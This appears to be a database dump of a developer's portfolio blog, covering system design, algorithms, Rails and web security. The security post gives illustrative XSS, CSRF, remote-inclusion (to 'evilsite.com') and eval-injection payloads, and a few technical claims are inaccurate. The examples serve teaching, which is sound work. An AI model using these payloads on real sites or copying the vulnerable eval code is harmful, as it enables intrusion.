15	body	<div>The act of limiting the number of requests sent to or from a system. Rate limiting is most often used to limit the number of incoming requests in order to prevent DoS attacks and can be enforced at the IP-address level, at the user-account level, or at the region level, for example. Rate limiting can also be implemented in tiers; for instance, a type of network request could be limited to 1 per second, 5 per 10 seconds, and 10 per minute.</div>	Post	12	2021-08-09 07:17:48.375854	2021-08-09 07:17:48.375854
3	description	<ul><li>Build features for Application for Fan Engagement &amp; Content Distribution SAAS using ruby, javascript, Sidekiq, Heroku.</li><li>Enhanced load time for pages by API and image optimizations. </li><li>Improved SEO by building sitemaps dynamically, adding meta sections for posts.</li><li>Discover vulnerabilities in a web application and fix them. </li><li>Participate in sprint planning, client meetings and Mentored Interns.</li></ul>	Experience	2	2021-08-07 18:53:13.366337	2021-08-09 07:56:54.82492
4	description	<ul><li>Reduced development effort in asp.net web forms by writing code generator script.</li><li>Amplified my knowledge by getting trained in the new domain and technologies, and later scripted MVC based web solutions both as a team and independently.</li><li>Responsible for the frontend, backend development, DevOps using ROR, ember.js, AWS, javascript, asp.net, react.js, HTML, CSS, Capistrano, Cloudflare.</li><li>Build Hybrid App using Cordova, ember.js, ROR, web sockets and published on play store.</li></ul>	Experience	3	2021-08-07 18:54:17.504359	2021-08-09 07:57:16.821637
9	body	<ul><li>More tables can make querying more difficult and <strong>expensive as the data grows</strong>. (Finding all posts that were created in a certain time frame would need to scan all associated tables)</li><li><strong>Cannot have foreign keys</strong>. The id column can reference any of the associated model tables, which can slow down querying. It must work in conjunction with the type column.</li><li>If your tables are very large, a lot of <strong>space is used to store the string values for postable_type</strong></li><li>Your data <strong>integrity is compromised</strong></li></ul><div><br></div>	Post	6	2021-08-07 20:27:55.192459	2021-08-07 20:27:55.192459
13	body	<div>A forward proxy, often called a proxy, proxy server, or web proxy, is a server that sits in <strong>front</strong> of a group of <strong>client machines</strong>. When those computers make requests to sites and services on the Internet, the proxy server intercepts those requests and then communicates with web servers on behalf of those clients, like a middleman.</div><div><action-text-attachment content-type="image" url="https://lh3.googleusercontent.com/xrgLRD7NA6N0dxYOOs0rxjrtYHN8CrpmBaL0s8dGLWmosA0Fv210wq8EsCO56Q_eZcY3dLk_CZ5uhkSCtkKCPsvkP3DtlGA8cheFs_PYXYzkTEynaPpf0_3G-7vPn1Pzktg3qT_j" width="460" height="163"></action-text-attachment></div><div><br></div><div>There are a few reasons one might want to use a forward proxy:</div><ul>\n<li>\n<strong>To avoid state or institutional browsing restrictions </strong>- Some governments, schools, and other organizations use firewalls to give their users access to a limited version of the Internet. A forward proxy can be used to get around these restrictions, as they let the user connect to the proxy rather than directly to the sites they are visiting.</li>\n<li>\n<strong>To block access to certain content </strong>- Conversely, proxies can also be set up to block a group of users from accessing certain sites. For example, a school network might be configured to connect to the web through a proxy which enables content filtering rules, refusing to forward responses from Facebook and other social media sites.</li>\n<li>\n<strong>To protect identity online</strong> - When a user desires to increase anonymity online, proxy can be used as Only the IP address of the proxy server will be visible.</li>\n</ul>	Post	10	2021-08-09 07:14:27.878481	2021-08-09 07:14:27.878481
14	body	<div>A reverse proxy is a server that sits in <strong>front of one or more web servers</strong>, intercepting requests from clients. This is different from a forward proxy, where the proxy sits in front of the clients. With a reverse proxy, when clients send requests to the origin server of a website, those requests are intercepted at the <a href="https://www.cloudflare.com/learning/serverless/glossary/what-is-edge-computing/">network edge</a> by the reverse proxy server. The reverse proxy server will then send requests to and receive responses from the origin server.</div><div><action-text-attachment content-type="image" url="https://lh5.googleusercontent.com/MJ9DqR7zq9N1Kk8khZrAFdJd7hJVy2TfpT9-eQLFL2_6HqnnIj9w1mCfqufdxtwnU_zkw2za1Owt0dZS4xi0R3U0pAA3CE5qCqdAiQyQIktE6y2_Gej2TePYOzuoZt1jTngKuZI9" width="508" height="181"></action-text-attachment></div><div>Below we outline some of the benefits of a reverse proxy:</div><ul>\n<li><strong>Load balancing</strong></li>\n<li>\n<strong>Protection from attacks</strong> - With a reverse proxy in place, a website or service never needs to reveal the IP address of its origin server(s). This makes it much harder for attackers to leverage a targeted attack against them, such as a <a href="https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/">DDoS attack</a>. </li>\n<li>\n<a href="https://www.cloudflare.com/learning/cdn/glossary/global-server-load-balancing-gslb/"><strong>Global Server Load Balancing</strong></a><strong> (GSLB)</strong> - In this form of load balancing, a website can be distributed on several servers around the globe and the reverse proxy will send clients to the server that’s geographically closest to them. This decreases the distances that requests and responses need to travel, minimizing load times.</li>\n<li>\n<strong>Caching</strong> - A reverse proxy can also <a href="https://www.cloudflare.com/learning/cdn/what-is-caching/">cache</a> content, resulting in faster performance. </li>\n<li>\n<strong>SSL encryption</strong> - <a href="https://www.cloudflare.com/learning/ssl/what-is-encryption/">Encrypting</a> and decrypting <a href="https://www.cloudflare.com/learning/security/glossary/what-is-ssl/">SSL</a> (or <a href="https://www.cloudflare.com/learning/security/glossary/transport-layer-security-tls/">TLS</a>) communications for each client can be computationally expensive for an origin server. A reverse proxy can be configured to decrypt all incoming requests and encrypt all outgoing responses, freeing up valuable resources on the origin server.</li>\n</ul>	Post	11	2021-08-09 07:16:04.176515	2021-08-09 07:16:04.176515
11	body	<div><strong>Functional Requirements</strong></div><ul>\n<li>Big URL → unique short URL (write operation)</li>\n<li>Short URL → Big URL (read operation)</li>\n<li>Length of short URL = 6 chars</li>\n<li>Random short URL</li>\n<li>Need user account to create short URL</li>\n<li>Monitoring/Analytics</li>\n</ul><div><br></div><div><strong>Non Functional Requirements</strong></div><ul>\n<li>Fault-tolerant service</li>\n<li>Highly available</li>\n<li>Minimize read/write latencies</li>\n<li>Scalable</li>\n<li>Consistency: strong</li>\n<li>Durability</li>\n<li>Minimum cost</li>\n</ul><div><br></div><div><strong>API’s</strong></div><ul>\n<li>Logon - We will be using an external identity provider like Fb, Google</li>\n<li>Logoff</li>\n<li>createShortUrl(userToken, bigUrl, optional expiryTime) : returns shortUrl</li>\n<li>getBigUrl(shortUrl) : returns bigUrl</li>\n</ul><div><br></div><div><action-text-attachment content-type="image" url="https://lh4.googleusercontent.com/3TzALKikAyoEjCvPxYdKcGxsE7A0uHHkPmcumPFlowwdr2ggT7PnjYOu_e1HmUvNyvidfc1827w1tcfDd8YQnNhpxQpGKYiuMVvB6rCGYgs-in2x7_Lb7X0wekXpZHZkiPnjRsnN" width="396" height="219"></action-text-attachment></div><div><br></div><div><strong>Why do we keep a minimum of three App servers?</strong></div><div>Suppose we had 2 Application servers and one of the servers is down due to periodic maintenance or some patch deployment. What if at that time the 2nd server also comes down. AS we want our application to be highly available, we should have at least 3 app servers. </div><div><br></div><div>There is a Monitoring system to check the health of the App servers. If CPU usage exceeds some threshold value, we can increase servers. This will make our system scalable. Similarly, if the load decreases, we can remove extra servers as well to reduce cost.</div><div><br></div><div><strong>Data Store</strong></div><div>If we have a single Data Store, it will not be highly available and scalable as there can be a single-point failure. For now, we can use partitioning. Datastore will have multiple partitions. Each partition will have 2 or more replicas/servers that will store data. This will ensure the datastore is highly available as if one of the hosts is down, the other host will be available to server read/write requests. </div><div>Also, we can increase partitions if the size of the data increases.</div><div>As we are storing data in multiple servers in a single partition. So if one partition fails, data will be available in the other partition.</div><div><br></div><div><strong>Cache</strong></div><div>The number of read requests will be way more than write requests. TO minimize load on the datastore, we can use some in-memory cache.</div><div>We can use a local cache with each application server or have a global cache. </div><div>For every read request, the App server will first check the global cache. If it's a miss, it will go to the data store.</div><div>We can use a combination of both local and global cache. First, we will check local, if miss, we will check the global cache, if miss, we will find it in the datastore</div><div><br></div><div><strong>Why use a combination of both local and global cache?</strong></div><div>\n<br><br><br><br><br>\n</div><div><strong>Short URL Generation</strong></div><div>Base 62 (a-z, A-Z, 0-9)<br>Base 64 (a-z, A-Z, 0-9, ‘-’, ‘_’) | 62^664^6 | ≈ 56.8 billion≈ 68.7 billion</div><div><br></div><div>We shouldn’t use unsafe characters like +, / in URL generation. As we will  need to URL encode which will increase the length of the short URL</div><div><br></div><div><strong>Approach 1</strong></div><div>Take MD5 hash of big URL, which will be 128-bit value. When this 128-bit value is encoded using base 64, it will result in 21 chars. As we need to have only 6 chars in a short URL, we can drop the first or last 15 chars. But this will increase the probability of collisions. So this is not a feasible approach</div><div><br></div><div><strong>Approach 2: Zoo-keeper service</strong></div><div>Zoo-keeper will maintain a range of counters that will be assigned to each app server and short URLs will be assigned by app servers on the base of the counter.</div><div>But this will add to cost and complexity as we are using another service.</div><div><br></div><div><strong>Approach 3: Key Generation Service</strong></div><div>We are giving the responsibility for key generation to another service. We are just shifting complexity to another service. </div><div>Also, the design of the KGF service will also dictate the design of the whole application. For example, if the KGF service is using a single server, there can be a single-point failure. Else we will need to have multiple servers. This will add extra cost and complexity</div><div><br></div><div><strong>Approach 4</strong></div><div> <action-text-attachment content-type="image" url="https://lh4.googleusercontent.com/G-DpGdw8oATHvOjiZftqW2xWdNjpbs52j1GWKvD8Y-KcSxm8oHAGxNddQobJXl7oPAWyPDhCKf6NQ8V1DzjY7VAqL7lV8t1KBLvK4DBt4S2Bh1suQZYNdE6h_U83arJeFNwhBdGm" width="271" height="296"></action-text-attachment>\n</div><div>\n<br><br><br><br><br><br>\n</div>	Post	8	2021-08-09 06:30:12.934945	2021-08-09 13:14:36.073675
8	body	<div>Polymorphic Association allows an ActiveRecord object to be connected with Multiple ActiveRecord objects. A perfect example of the Polymorphic Association is a social site where users can comment on anywhere whether it is videos, photos, links, status updates etc. It would not be feasible if you have to create an individual comment like photos_comments, videos_comment and so on.</div><div>Polymorphic associations allow a model to belong to more than one other model through a single association.</div><div>\n<action-text-attachment content-type="image" url="https://lh3.googleusercontent.com/M0wlNussJf4Rs2EbQt9ZcpFqQFlJPm-F2VHUZn6zN07oX93f2MbQuYIXJvTICRZGMcloo47pbmrE5C6rCge2hrDyryYq__eKKsp5D1bNvg6qR657wCWIdX27SstzfhG4QACNFMPCEudrDE8TJg" width="330" height="176"></action-text-attachment><action-text-attachment content-type="image" url="https://lh5.googleusercontent.com/ASyMeMhD5Bdq9NUkVdow1wFV_Q23HJ5GjbY54Fy7jtNH-cY5ekk8bvs5wmbRN7NTN_yKYX-W8ixlYWvM0ukEG_uACj9uf128WSIPcy_viN9DvSdrGi98feyxUb_Zbh1LD71fbGYxh1hBwfH8qg" width="379" height="222"></action-text-attachment>\n</div>	Post	5	2021-08-07 20:27:07.615992	2021-08-09 07:11:51.263355
10	body	<div>In designing a data model, you will sometimes find a model that should have a relation to itself. For example, you may want to store all employees in a single database model, but be able to trace relationships such as between <strong>manager</strong> and <strong>subordinates</strong>. This situation can be modelled with self-joining associations:</div><pre class="language-rb">class Employee &lt; ApplicationRecord\r\n  has_many :subordinates, class_name: "Employee", foreign_key: "manager_id"\r\n  belongs_to :manager, class_name: "Employee"\r\nend\r\n\r\nclass CreateEmployees &lt; ActiveRecord::Migration[5.0]\r\n  def change\r\n    create_table :employees do |t|\r\n      t.references :manager, index: true\r\n      t.timestamps\r\n    end\r\n  end\r\nend</pre>	Post	7	2021-08-07 20:42:26.931476	2021-08-18 23:26:39.033711
16	body	<ul><li>Starting from the first index, compare the first and the second elements. If the first element is greater than the second element, they are swapped. Now, compare the second and third elements. Swap them if they are not in order. The above process goes on until the last element.</li></ul><div><br></div><ul><li>The same process goes on for the remaining iterations. After each iteration, the largest element among the unsorted elements is placed at the end. In each iteration, the comparison takes place up to the last unsorted element. </li></ul><div><br></div><div>Time Complexities:</div><ul>\n<li>\n<strong>Worst Case Complexity</strong>:O(n2)<br>If we want to sort in ascending order and the array is in descending order then, the worst case occurs.</li>\n<li>\n<strong>Best Case</strong> Complexity:O(n)<br>If the array is already sorted, then there is no need for sorting.</li>\n<li>\n<strong>Average Case</strong> Complexity:O(n2)<br>It occurs when the elements of the array are in jumbled order (neither ascending nor descending).</li>\n</ul><div><br></div><pre class="language-rb">def bubble_sort(ar)\r\n  size = ar.length\r\n  ar.each_with_index do |_item, index|\r\n    (0...size - 1 - index).each do |ind|\r\n      ar[ind], ar[ind + 1] = ar[ind + 1], ar[ind] if ar[ind + 1] &lt; ar[ind]\r\n    end\r\n  end\r\n  ar.to_s\r\nend</pre><div><br></div>	Post	13	2021-08-09 07:50:34.482034	2021-08-09 07:50:34.482034
12	body	<div><strong>Points to consider before solving this problem:</strong></div><ul>\n<li>Does the array contain only positive or negative numbers?</li>\n<li>What if the same pair repeats twice, should we print it every time?</li>\n<li>If the reverse of the pair is acceptable e.g. can we print both (4,1) and (1,4) if the given sum is 5.</li>\n<li>Do we need to print only a distinct pair? does (3, 3) is a valid pair forgiven sum of 6?</li>\n<li>How big is the array?</li>\n</ul><div><br></div><div><strong>Brute Force Solution</strong></div><div>A simple solution is to traverse each element and check if there’s another number in the array which can be added to it to give a sum.</div><div><br></div><pre class="language-rb">def findPairBrutforce(ar, sum)\r\n\tpairs = []\r\n\tlength = ar.length\r\n\tar.each_with_index  do |n1, index|\r\n\t\tn2 = sum - n1\r\n\t\tar[index+1..length].each do |e2|\r\n\t\t\tif(n2 == e2)\r\n\t\t\t\tpairs &lt;&lt; [n1, n2]\r\n\t\t\t\tbreak\r\n\t\t\tend\r\n\r\n\t\tend\r\n\tend\r\n\treturn pairs.to_s\r\nend</pre><div><strong>Method 2 (Use hashing). </strong></div><div>We create an empty hash table. Now we traverse through the array and check for pairs in the hash table. If a matching element is found, we print the pair number of times equal to the number of occurrences of the matching element. </div><div><br></div><div>Note that the worst case of time complexity of this solution is O(c + n) where c is the count of pairs with a given sum.</div><div><br></div><pre class="language-rb">def findPairUsingHash(ar, sum)\r\n\tpairs = []\r\n\tar_hash = {}\r\n\t# ar.each{|e| ar_hash[e] = true}\r\n\r\n\tar.each do |e|\r\n\t\tar_hash[e] = ar_hash[e].to_i + 1\r\n\t\tif ar_hash[sum - e] != nil\r\n\t\t\tpairs &lt;&lt; [e, sum - e]\r\n\t\tend\r\n\tend\r\n\r\n\treturn pairs.to_s\r\nend</pre>	Post	9	2021-08-09 06:33:33.221961	2021-08-09 07:54:53.861098
19	body	<div><strong>Cookies vs LocalStorage</strong></div><div>\n<strong>Automatic management</strong>: Cookies are automatically saved, sent and removed by the browser. The frontend developer does not have to worry about implementing this part, nor is there any scope of a mistake from the frontend side. This is not true for local storage.</div><div><br></div><div>\n<strong>Sharing the same session across subdomains:</strong> The objective here is that the user should use the same session when navigating to different subdomains of a site. This can be <strong>easily done via cookies</strong> by setting the cookie domain as “.yoursite.com”.</div><div>This is not easily possible to do via local storage since the store is not shared across domains/subdomains. One can use iframes to hack around this, however, it’s non-trivial.</div><div><br></div><div>\n<strong>Token misuse via XSS attack</strong>: An XSS attack happens when “malicious” JavaScript is injected into a website. Some ways in which this code injection can happen are incorrect input/output validation, a rogue third party script being loaded into the site’s frontend code or social engineering.</div><div><br></div><div>If using localstorage, the malicious JS code can easily read the session tokens and transmit them to the attacker. The attacker would then put these tokens into their browser and have significant, if not complete access to that user’s account.</div><div><br></div><div>Cookies have this special flag called <strong>httpOnly</strong>. If set, it prevents any JS on the frontend from reading that cookie’s value. This means that the malicious JS code cannot send the access token to the attacker. However, that code can still do malicious API calls while the user is using the site. Depending on the product and the reason for the attack, that may not be enough to fulfil the attacker’s intention.</div><div><br></div><div><strong>httpOnly, secure cookies is the right way to go for storing session tokens.</strong></div>	Post	16	2021-08-09 08:39:44.721341	2021-08-09 08:39:44.721341
20	body	<div><strong>SQL Injection</strong></div><div>The injection is a security vulnerability that allows an attacker to alter backend SQL statements by manipulating the user-supplied data. </div><div><br></div><div><strong>Implication</strong></div><ul>\n<li>An attacker can inject malicious content into the vulnerable fields.</li>\n<li>Sensitive data like Usernames, Passwords, etc. can be read from the database.</li>\n<li>Database data can be modified (Insert/Update/ Delete).</li>\n<li>Administration Operations can be executed on the database</li>\n</ul><div><br></div><div><strong>Recommendations</strong></div><ul>\n<li>Whitelisting the input fields</li>\n<li>Avoid displaying detailed error messages that are useful to an attacker.</li>\n</ul><div><br></div><div><strong>Cross-Site Scripting (XSS)</strong></div><div>XSS vulnerabilities target scripts embedded in a page that is executed on the client side i.e. user browser rather than at the server-side. These flaws can occur when the application takes untrusted data and sends it to the web browser without proper validation.</div><div>Attackers can use XSS to execute malicious scripts on the users, in this case victim browsers. Since the browser cannot know if the script is trusty or not, the script will be executed, and the attacker can hijack session cookies, deface websites, or redirect the user to unwanted and malicious websites.</div><div><strong>XSS is an attack which allows the attacker to execute the scripts on the victim's browser.</strong></div><div><br></div><div>\n<strong>Implication</strong>:</div><ul><li>Making use of this security vulnerability, an attacker can inject scripts into the application, can steal session cookies, deface websites, and can run malware on the victim's machines.</li></ul><div><br></div><div><strong>Vulnerable Objects</strong></div><ul>\n<li>Input Fields</li>\n<li>URLs</li>\n</ul><div>\n<a href="http://demo.testfire.net/search.aspx?txtSearch">http://demo.testfire.net/search.aspx?txtSearch</a> &lt;iframe&gt; &lt;src = <a href="http://google.com">http://google.com</a> width = 500 height 500&gt;&lt;/iframe&gt;</div><div>The above script when run, the browser will load an invisible frame pointing to <a href="http://google.com">http://google.com</a>.</div><div>The attack can be made serious by running a malicious script on the browser.</div><div><br></div><div><strong>Recommendations</strong></div><ol>\n<li>White Listing input fields</li>\n<li>Input Output encoding</li>\n</ol><div><br></div><div><strong>Cross Site Request Forgery</strong></div><div>CSRF attack is an attack that occurs when a malicious website, email, or program causes a user's browser to perform an unwanted action on a trusted site for which the user is currently authenticated.</div><div>A CSRF attack forces a logged-on victim's browser to send a forged HTTP request, including the victim's session cookie and any other automatically included authentication information, to a vulnerable web application.</div><div>A link will be sent by the attacker to the victim when the user clicks on the URL when logged into the original website, the data will be stolen from the website.</div><div><strong>Implication</strong></div><ul><li>Using this vulnerability as an attacker can change user profile information, change status, create a new user on admin behalf, etc.</li></ul><div><br></div><div><strong>Vulnerable Objects</strong></div><ul>\n<li>User Profile page</li>\n<li>User account forms</li>\n<li>Business transaction page</li>\n</ul><div><br></div><div><strong>Examples</strong></div><div>The victim is logged into a bank website using valid credentials. He receives mail from an attacker saying "Please click here to donate $1 to cause."</div><div>When the victim clicks on it, a valid request will be created to donate $1 to a particular account.</div><div>\n<a href="http://www.vulnerablebank.com/transfer.do?account=cause&amp;amount=1">http://www.vulnerablebank.com/transfer.do?account=cause&amp;amount=1</a> </div><div>The attacker captures this request and creates the below request and embeds in a button saying "I Support Cause."</div><div>\n<a href="http://www.vulnerablebank.com/transfer.do?account=Attacker&amp;amount=1000">http://www.vulnerablebank.com/transfer.do?account=Attacker&amp;amount=1000</a> </div><div>Since the session is authenticated and the request is coming through the bank website, the server would transfer $1000 dollars to the attacker.</div><div><br></div><div><strong>Recommendation</strong></div><ol>\n<li>Mandate the user's presence while performing sensitive actions.</li>\n<li>Implement mechanisms like CAPTCHA, Re-Authentication, and Unique Request Tokens.</li>\n</ol><div><br></div><div><strong>Insecure Cryptographic Storage</strong></div><div>is a common vulnerability which exists when the sensitive data is not stored securely. The user credentials, profile information, health details, credit card information, etc. come under sensitive data information on a website.</div><div>This data will be stored on the application database. When this data are stored improperly by not using encryption or hashing*, it will be vulnerable to the attackers.</div><div>(*Hashing is transformation of the string characters into shorter strings of fixed length or a key. To decrypt the string, the algorithm used to form the key should be available)</div><div><strong>Implication</strong></div><ul><li>By using this vulnerability, an attacker can steal, modify such weakly protected data to conduct identity theft, credit card fraud or other crimes.</li></ul><div><strong>Vulnerable objects</strong></div><ul><li>Application database.</li></ul><div><strong>Examples</strong></div><div>In one of the banking application, password database uses unsalted hashes * to store everyone's passwords. An SQL injection flaw allows the attacker to retrieve the password file. All the unsalted hashes can be brute forced in no time whereas the salted passwords would take thousands of years.</div><div>(*<strong>Unsalted Hashes</strong> – Salt is a random data appended to the original data. <strong>Salt</strong> is appended to the password before hashing)</div><div><strong>Recommendations</strong></div><ol>\n<li>Ensure appropriate strong standard algorithms. Do not create your own cryptographic algorithms. Use only approved public algorithms such as AES, RSA public key cryptography, and SHA-256, etc.</li>\n<li>Ensure offsite backups are encrypted, but the keys are managed and backed up separately.</li>\n</ol><div><br></div><div><strong>Insufficient Transport Layer Protection</strong></div><div>Deals with information exchange between the user (client) and the server (application). Applications frequently transmit sensitive information like authentication details, credit card information, and session tokens over a network.</div><div>By using weak algorithms or using expired or invalid certificates or not using SSL can allow the communication to be exposed to untrusted users, which may compromise a web application and or steal sensitive information.</div><div><strong>Implication</strong></div><ul>\n<li>Making use of this web security vulnerability, an attacker can sniff legitimate user's credentials and gain access to the application.</li>\n<li>Can steal credit card information.</li>\n</ul><div><strong>Vulnerable objects</strong></div><ul><li>Data sent over the network.</li></ul><div><strong>Recommendations</strong></div><ol>\n<li>Enable secure HTTP and enforce credential transfer over HTTPS only.</li>\n<li>Ensure your certificate is valid and not expired.</li>\n</ol><div>\n<strong>Examples</strong>:</div><div>1. An application not using SSL, an attacker will simply monitor network traffic and observe an authenticated victim session cookie. An attacker can steal that cookie and perform a <strong>Man-in-the-Middle attack</strong>.</div><div><br></div><div><strong>Porous Defenses</strong></div><div>This first weakness type encompasses flaws that could allow users to bypass or spoof authentication and authorization processes. Authentication verifies the identity of someone trying to access a system while authorization is the set of access and usage permissions assigned to the user.</div><div>Porous defence flaw examples include: </div><ul>\n<li>Weak password encoding</li>\n<li>Insufficiently protected credentials</li>\n<li>Missing or single-factor authentication</li>\n<li>Insecurely inherited permissions</li>\n<li>Sessions that don’t expire in a timely manner</li>\n</ul><div><br></div><div><strong>Code Injection</strong></div><div>Code Injection is the general term for attack types which consist of injecting code that is then interpreted/executed by the application. This type of attack exploits poor handling of untrusted data. </div><div><strong>Examples</strong></div><div><br></div><div><strong>Example 1</strong></div><div>If an application passes a parameter sent via a GET request to the PHP include() function with no input validation, the attacker may try to execute code other than what the developer had in mind.</div><div>The URL below passes a page name to the include() function. <a href="http://testsite.com/index.php?page=contact.php">http://testsite.com/index.php?page=contact.php</a>\n</div><div><br></div><div>The file “evilcode.php” may contain, for example, the phpinfo() function which is useful for gaining information about the configuration of the environment in which the web service runs. An attacker can ask the application to execute their PHP code using the following request: <a href="http://testsite.com/?page=http://evilsite.com/evilcode.php">http://testsite.com/?page=http://evilsite.com/evilcode.php</a>\n</div><div><br></div><div><strong>Example 2 (Using Eval on params)</strong></div><div>When a developer uses the PHP eval() function and passes it untrusted data that an attacker can modify, code injection could be possible.</div><div>The example below shows a dangerous way to use the eval() function:</div><div>$myvar = "varname";</div><div>$x = $_GET['arg'];</div><div>eval("$myvar = $x;");</div><div><br></div><div>As there is no input validation, the code above is vulnerable to a Code Injection attack.</div><div>For example: /index.php?arg=1; phpinfo()</div><div><br></div><div><strong>Sensitive Data exposure</strong></div><div>When applications don’t protect sensitive data including passwords, emails, financial, health-related data. </div><div><br></div><div><strong>Security Misconfigurations</strong></div><div>For example, when the database is exposed on a public network.</div><div><br></div><div><strong>Broken access control</strong></div><div>Restrictions on what authenticated users are allowed to do are often not properly enforced. </div><div><br></div>	Post	17	2021-08-09 08:41:14.70515	2021-08-09 08:41:14.70515
17	body	<div>To sort an array of size n in ascending order: </div><div>1: Iterate from arr[1] to arr[n] over the array. </div><div>2: Compare the current element (key) to its predecessor. </div><div>3: If the key element is smaller than its predecessor, compare it to the elements before. Move the greater elements one position up to make space for the swapped element.</div><pre class="language-rb">def insertion_sort(ar)\r\n  return ar.to_s if ar.length == 1\r\n\r\n  (1...ar.length).each do |i|\r\n    j = i\r\n    while j &gt; 0\r\n      if ar[j] &lt; ar[j - 1]\r\n        ar[j - 1], ar[j] = ar[j], ar[j - 1]\r\n      else\r\n        break\r\n      end\r\n      j -= 1\r\n    end\r\n  end\r\n  ar.to_s\r\nend </pre>	Post	14	2021-08-09 08:23:54.400378	2021-08-09 08:25:20.650308
18	body	<div>The selection sort algorithm sorts an array by repeatedly finding the minimum element (considering ascending order) from the unsorted part and putting it at the beginning. The algorithm maintains two subarrays in a given array.</div><div>1) The subarray which is already sorted.</div><div>2) Remaining subarray which is unsorted.</div><div>In every iteration of selection sort, the minimum element (considering ascending order) from the unsorted subarray is picked and moved to the sorted subarray.</div><div><action-text-attachment content-type="image" url="https://lh4.googleusercontent.com/dXPgP9naZMYEpBJ3_pofZHZVgTM7Rsb2hf0QR1po8YUxiw1ZYT8LFv-hK3HKM0j6_fdaoz2NGDwHTst71iYy8wvJXWskwC6bZOSSqNOxMXap6pr_z6QniTwqdiIU27LX7eUpPQDH" width="567" height="334"></action-text-attachment></div><pre class="language-rb">def selection_sort(arr)\r\n  return arr if arr.length &lt;= 1\r\n\r\n  (0..arr.length - 2).each do |current_id|\r\n    smallest_id = current_id\r\n    Range.new(current_id + 1, arr.length - 1).each do |i|\r\n      smallest_id = i if arr[i] &lt; arr[smallest_id]\r\n    end\r\n    arr[current_id], arr[smallest_id] = arr[smallest_id], arr[current_id]\r\n  end\r\n  arr\r\nend</pre><div><br></div><div>Time Complexity: <strong>O(n2)</strong> as there are two nested loops.</div><div>Auxiliary Space: O(1)</div><div>The good thing about selection sort is it never makes more than O(n) swaps and <strong>can be useful when memory write is a costly</strong> operation.</div>	Post	15	2021-08-09 08:31:37.401488	2021-08-09 08:31:37.401488
22	description	<div>A side project which I made to practice my new learnings on the flutter platform. <br>Recently I started to learn about finances and took my financial decision into my own hand. <br>So I started to learn more about this and thought of making an app on financial instruments.</div><div>I built this app from scratch and published it on the android play store.</div><div><br></div><div><strong>Contribution/Features</strong></div><ol><li>Various financial calculators to calculate the future value of various financial instruments like SIP, EMI, FD. </li><li>Income Tax Calculator with Indian standards and returns for various Indian investment schemes.</li><li>News Section to see business and technology news.</li></ol><div><br></div><div><strong>Technology</strong>: Flutter, dart</div><div><a href="https://play.google.com/store/apps/details?id=com.way2itech.fincalc&amp;hl=en_IN&amp;gl=US">Android Store Link</a></div><div><br></div>	Project	2	2021-08-09 12:31:40.961705	2021-08-10 19:41:33.890365
23	body	<div>An anagram of a string is another string that contains the same characters, only the order of characters can be different. For example, “abcd” and “dabc” are an anagram of each other.</div><div><br></div><pre class="language-rb">def is_anagram?(str1, str2)\r\n\treturn false if(str1.length != str2.length)\r\n\tstr1.split('').sort == str2.split('').sort\r\nend</pre><div><br></div><div><strong>Using 2 arrays</strong></div><pre class="language-rb">def is_anagram?(str1, str2)\r\n\tar1 = Array.new(256, 0)\r\n\tar2 = Array.new(256, 0)\r\n\tstr1.each_char do |char|\r\n\t\tar1[char.ord] += 1 \r\n\tend\r\n\r\n\tstr2.each_char do |char|\r\n\t\tar2[char.ord] += 1 \r\n\tend\r\n\r\n\t(0..255).each do |e|\r\n\t\tif(ar1[e] != ar2[e])\r\n\t\t\treturn false\r\n\t\tend\r\n\tend\r\n\treturn true\r\nend</pre><div><strong>Method 3 (count characters using one array) </strong></div><div>The above implementation can be further to use only one count array instead of two. We can increment the value in the count array for characters in str1 and decrement for characters in str2. Finally, if all count values are 0, then the two strings are anagram of each other.</div><div><br></div>	Post	18	2021-08-09 13:05:18.498171	2021-08-09 13:05:18.498171
21	description	<div>Product developed to display detailed information of all the products sold by the company across different platforms. The system communicates with multiple applications from where it reads, transforms, and indexes the data locally. The tool is used by customer care executives, vendors, and merchandisers.</div><div><br></div><div><strong>Technology stack</strong> - ROR, ReactJS, SOLR, GCP, Kubernetes, GitHub, Jenkins, PostgreSQL, and Docker.</div><div><br></div><div><strong>My Contributions</strong></div><ul><li>Developed &amp; maintained Microservices using Ruby on Rails, Google Cloud Platform, Docker which fetches and transforms data from sources like AS400 and Oracle.</li><li>Write Kubernetes jobs to schedule the background tasks related to SOLR indexing and data retrieval into PostgreSQL and backups.</li><li>Implemented and maintained back-end services for the Frontend on React.js</li></ul>	Project	1	2021-08-09 12:30:10.730958	2021-08-09 21:55:01.662935
24	body	<div>A transaction is a collection of instructions. To maintain the integrity of a database, all transactions must obey ACID properties. ACID is an acronym for</div><div>atomicity, consistency, isolation, and durability</div><div>\n<strong><br>1. Atomicity<br></strong>A transaction is an atomic unit; hence, all the i<strong>nstructions within a transaction will successfully execute, or none of them will execute</strong>. The following transaction transfers 20 dollars from Alice’s bank account to Bob’s bank account. If any of the instructions fail, the entire transaction should abort and rollback.</div><div><action-text-attachment content-type="image" url="https://lh4.googleusercontent.com/gh1y1lzAXgQLukPQitFMnRr3yoCaQAQEkBzNK4I7V4ZQZ93y2spvQRAD9VM15y0QGSH0FDYtp2W9gL9UxS7krC8ChoLEcXVPk7iFwcJBsLkCtQCGN7-P9UlyMxnBw_7ZtMgmv36c" width="159" height="192"></action-text-attachment></div><div>A transaction to transfer 20 pounds from Alice's account to Bob's account.</div><div>\n<strong><br>2. Consistency<br></strong>A database is initially in a consistent state, and it should <strong>remain consistent after every transaction</strong>. Suppose that the transaction in the previous example fails after Write(A_b) and the transaction is not rolled back; then, the database will be inconsistent as the sum of Alice and Bob’s money, after the transaction, will not be equal to the amount of money they had before the transaction.</div><div>\n<strong><br>3. Isolation<br></strong>If the multiple transactions are <strong>running concurrently</strong>, they <strong>should not be affected by each other;</strong> i.e., the result should be the same as the result obtained if the transactions were running sequentially. Suppose B_bal is initially 100. If a context switch occurs after B_bal *= 20, then the changes should only be visible to T2 once T1 commits. This ensures consistency in the data and prevents incorrect results.</div><div><action-text-attachment content-type="image" url="https://lh3.googleusercontent.com/-3Vt85rphZqZcyWj05evPTpz3vTXr1EUf3c3ALGSC_2WQ-Fe0GrWYF9jGxQH73Uw6kSauWn0fdVoOw8Rz6PuNYPuTQlnmKX2uPOdruGOjonSuE6vSDvKhKy_HnQMng8B_DKqkyVA" width="301" height="169"></action-text-attachment></div><div><strong>T1 adds 20% interest to Bob's savings account and T2 adds 20 pounds to Bob's account.</strong></div><div>\n<strong><br>4. Durability<br>Changes that have been committed</strong> to the database should <strong>remain even in the case of software and hardware failure</strong>. For instance, if Bob’s account contains $120, this information should not disappear upon hardware or software failure.</div>	Post	